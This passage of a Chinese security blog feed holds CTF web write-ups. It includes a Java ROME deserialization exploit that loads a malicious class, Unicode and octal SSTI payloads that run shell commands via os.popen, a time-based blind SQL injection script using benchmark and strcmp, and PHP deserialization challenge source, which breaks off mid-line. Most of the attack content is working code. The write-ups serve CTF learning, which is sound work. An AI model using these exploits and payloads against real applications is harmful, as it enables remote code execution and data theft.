class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192426584.png" alt="image-20221116192426584"></p><h2 id="é•¿åŸæ¯2022-b4bycoffee"><a href="#é•¿åŸæ¯2022-b4bycoffee" class="headerlink" title="[é•¿åŸæ¯2022]b4bycoffee"></a>[é•¿åŸæ¯2022]b4bycoffee</h2><p>å‘ç°ååºåˆ—åŒ–ç‚¹å’Œrome1.7ä¾èµ–</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192431761.png" alt="image-20221116192431761"></p><p>è‡ªç„¶æƒ³åˆ°æ˜¯æ‰“romeé“¾ï¼Œä½†æ˜¯åœ¨toolsçš„<strong>AntObjectInputStream</strong>ä¸­è¿‡æ»¤æ‰äº†å¸¸ç”¨çš„å‡ ä¸ªç±»</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192436211.png" alt="image-20221116192436211"></p><p>æ²¡äº†TemplatesImplï¼Œä¸èƒ½åŠ è½½æ¶æ„å­—èŠ‚ç äº†ï¼Œä½†æ­¤é¢˜è¿›è¡Œäº†ç±»åŠ è½½ï¼Œè€Œä¸”ç›´æ¥è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œæ‰€ä»¥åªéœ€æ§åˆ¶ClassByteä¸ºæ¶æ„ç±»ï¼Œç„¶åç›´æ¥è°ƒç”¨å®ƒçš„toStringæ–¹æ³•å°±å¯ä»¥äº†</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192440252.png" alt="image-20221116192440252"></p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.b4bycoffee;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.b4bycoffee.model.CoffeeBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classByte</span> <span class="operator">=</span> coffeeBean.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Evil.class&quot;</span>));</span><br><span class="line">        classByte.set(coffeeBean,bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(CoffeeBean.class, coffeeBean);</span><br><span class="line"><span class="comment">//        equalsBean.beanHashCode();</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Exp.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"><span class="comment">//        serialize(hashMap);</span></span><br><span class="line"><span class="comment">//        unseralize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯ç”¨çš„ä¸Šé¢é‚£ä¸ªæ¶æ„ç±»ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥å†™ä¸ªåå¼¹shellçš„æ¶æ„ç±»ï¼Œæ³¨æ„ä¸€ä¸‹ä¼ å‚è§„å®šç”¨jsonå½¢å¼ä¼ </p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192445659.png" alt="image-20221116192445659"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ‹Ÿæ€web</title>
      <link href="/2022/11/07/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/"/>
      <url>/2022/11/07/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/</url>
      
        <content type="html"><![CDATA[<h1 id="2022å¼ºç½‘æ‹Ÿæ€-Web"><a href="#2022å¼ºç½‘æ‹Ÿæ€-Web" class="headerlink" title="2022å¼ºç½‘æ‹Ÿæ€-Web"></a>2022å¼ºç½‘æ‹Ÿæ€-Web</h1><h2 id="æ²¡æœ‰äººæ¯”æˆ‘æ›´æ‡‚py"><a href="#æ²¡æœ‰äººæ¯”æˆ‘æ›´æ‡‚py" class="headerlink" title="æ²¡æœ‰äººæ¯”æˆ‘æ›´æ‡‚py"></a>æ²¡æœ‰äººæ¯”æˆ‘æ›´æ‡‚py</h2><p>è¿æ°”ä¸é”™ï¼Œæ‹¿äº†ä¸ªäºŒè¡€</p><p>sstiï¼Œè¿‡æ»¤äº†å­—æ¯</p><p>åœ¨python3ä¸­æ”¯æŒ Non-ASCII Identifies ï¼Œå¯åˆ©ç”¨Unicodeå­—ç¬¦çš„NFKC(æ ‡å‡†æ¨¡å¼)ç»•è¿‡å­—æ¯é™åˆ¶ï¼Œå…·ä½“åˆ†æå¯å‚è€ƒ<a href="https://xz.aliyun.com/t/9271">æ–‡ç« </a>ï¼Œå­—æ¯æœ‰äº†ï¼Œå‰©ä¸‹çš„å°±å’Œæ™®é€šçš„sstiæ²¡ä»€ä¹ˆåŒºåˆ«äº†ï¼Œå‘½ä»¤æ‰§è¡Œè¯»flag</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&#123;ï½‡.ï½ï½ï½.__ï½‡ï½Œï½ï½‚ï½ï½Œï½“__.__ï½‚ï½•ï½‰ï½Œï½”ï½‰ï½ï½“__[&#x27;__ï½‰ï½ï½ï½ï½’ï½”__&#x27;](&#x27;ï½ï½“&#x27;).ï½ï½ï½ï½…ï½(&#x27;ï½ƒï½ï½” /ï½†ï½Œï½ï½‡&#x27;).ï½’ï½…ï½ï½„()&#125;&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿™é¢˜ä¹Ÿå¯ä»¥ç”¨å…«è¿›åˆ¶ç»•è¿‡</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&#123;()[&quot;__\\143\\154\\141\\163\\163__&quot;][&quot;__\\155\\162\\157__&quot;][1][&quot;__\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163__&quot;]()[247][&quot;__\\151\\156\\151\\164__&quot;][&quot;__\\147\\154\\157\\142\\141\\154\\163__&quot;][&quot;\\157\\163&quot;][&quot;\\160\\157\\160\\145\\156&quot;](&quot;\\143\\141\\164\\40\\57\\146\\154\\141\\147&quot;)[&quot;\\162\\145\\141\\144&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="popsql"><a href="#popsql" class="headerlink" title="popsql"></a>popsql</h2><p>passwordå¤„å­˜åœ¨æ—¶é—´ç›²æ³¨</p><p>fuzzä¸€ä¸‹ï¼Œè¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°ï¼Œä½†ä»”ç»†æ‰¾æ‰¾èƒ½æ‰¾åˆ°å¯¹åº”ä»£æ›¿çš„å‡½æ•°</p><p><strong>benchmark</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æ¥æµ‹è¯•æŸäº›ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦</span><br></pre></td></tr></table></figure><p>è¦è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼Œæœ€é‡è¦çš„å°±æ˜¯sleepå‡½æ•°ï¼Œbenchmarkå®Œç¾æ›¿ä»£äº†sleep</p><p><a href="https://imgse.com/i/ppbKrIe"><img src="https://s1.ax1x.com/2023/04/09/ppbKrIe.png" alt="ppbKrIe.png"></a></p><p><strong>strcmp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STRCMP (str1, str2) æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰è¿”å›0ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ ¹æ®å½“å‰çš„æ’åºå°äºç¬¬äºŒä¸ªå‚æ•°é¡ºåºè¿”å›-1ï¼Œå¦åˆ™è¿”å›1ã€‚</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿‡æ»¤äº†<code>=&lt;&gt;like relike regexp</code>,æ‰€ä»¥åˆ©ç”¨strcmpæ¯”è¾ƒçš„æ•ˆæœæ¥å……å½“ç­‰å·</p><p><a href="https://imgse.com/i/ppbKyPH"><img src="https://s1.ax1x.com/2023/04/09/ppbKyPH.png" alt="ppbKyPH.png"></a></p><p>ç”±äºè¿‡æ»¤äº†<code>in</code>ï¼Œæ‰€ä»¥è¡¨åç”¨sysé‡Œé¢çš„è§†å›¾æ¥æŸ¥</p><p>æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯å­—æ®µåçš„æŸ¥è¯¢</p><p>mysqlä¸­ï¼Œå¯ä»¥ç”¨<code>select query from sys.statement_analysis</code>æ¥æŸ¥çœ‹æ‰§è¡Œè¿‡çš„sqlè¯­å¥</p><p><a href="https://imgse.com/i/ppbK6Gd"><img src="https://s1.ax1x.com/2023/04/09/ppbK6Gd.png" alt="ppbK6Gd.png"></a></p><p>è¿™æ ·å¯ä»¥ä¸€æ¡ä¸€æ¡çˆ†ç ´æ‰§è¡Œè¿‡çš„sqlè¯­å¥ï¼Œæœ€ç»ˆæŸ¥åˆ°ä¸€æ¡ä¸å­—æ®µåç›¸å…³çš„è¯­å¥ï¼Œè·å¾—å­—æ®µåï¼š<code>f1aG123</code></p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">dict</span> = <span class="string">&quot; ,()`=.*?&gt;&lt;@-&#123;&#125;&quot;</span>+string.ascii_letters+string.digits</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">dict</span>)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">            <span class="comment"># æŸ¥åº“:ctfgame</span></span><br><span class="line">            <span class="comment"># &quot;password&quot;: &quot;123&#x27;or(if(strcmp(ord(right(database(),1)),&#123;&#125;),0,benchmark(10000000,md5(sha1(&#x27;hello&#x27;)))))#&quot;.format(i, ord(j))</span></span><br><span class="line">            <span class="comment"># æŸ¥è¡¨:Fl49ish3re</span></span><br><span class="line">            <span class="comment"># &quot;password&quot;: &quot;123&#x27;or(if(strcmp(ord(right((select(group_concat(table_name))from(sys.x$schema_table_statistics)),&#123;&#125;)),&#123;&#125;),0,benchmark(10000000,md5(sha1(&#x27;hello&#x27;))))#&quot;.format(i, ord(j))</span></span><br><span class="line">            <span class="comment"># æŸ¥å­—æ®µå:f1aG123</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&#x27;or(if(strcmp(ord(right((select(query)from(sys.statement_analysis)limit/**/5,1),&#123;&#125;)),&#123;&#125;),0,benchmark(10000000,md5(sha1(&#x27;hello&#x27;))))#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line">            <span class="comment"># æŸ¥flag</span></span><br><span class="line">            <span class="comment"># &quot;password&quot;: &quot;123&#x27;or(if(strcmp(ord(right((select(group_concat(f1aG123))from(Fl49ish3re)limit/**/0,1),&#123;&#125;)),&#123;&#125;),0,benchmark(10000000,md5(sha1(&#x27;hello&#x27;))))#&quot;.format(i, ord(j))</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        re = requests.post(url=url, data=date)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        t = end_time - start_time</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">2</span>:</span><br><span class="line">            result += j</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="ezus"><a href="#ezus" class="headerlink" title="ezus"></a>ezus</h2><p><strong>æºç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;tm.php&#x27;</span>; <span class="comment">// Next step in tm.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/tm\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;no way!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/tm.php$/&#x27;</span>, <span class="variable">$path</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/index.php$/&#x27;</span>, <span class="variable">$path</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»•è¿‡basenameï¼Œ<a href="https://www.modb.pro/db/478844">CTFä¸­basename()ç»•è¿‡å°ç»“</a></p><p>æ‹¿åˆ°<strong>tm.php</strong>æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/tm.php/å‘¢?source</span><br></pre></td></tr></table></figure><p><strong>tm.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserAccount</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$password</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_sleep</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ob</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;@0@0@0@&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ob</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object_weakup</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;@0@0@0@&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$ob</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span>, <span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;f = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//something in hint.php</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;hint != <span class="string">&quot;pass&quot;</span> || <span class="variable language_">$this</span>-&gt;f != <span class="string">&quot;pass&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;f = <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$this</span>-&gt;hint, FILTER_VALIDATE_URL))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$this</span>-&gt;hint);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;f)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;f, <span class="string">&quot;try&quot;</span>) !==  <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;f, <span class="string">&quot;pass&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    @<span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;f . <span 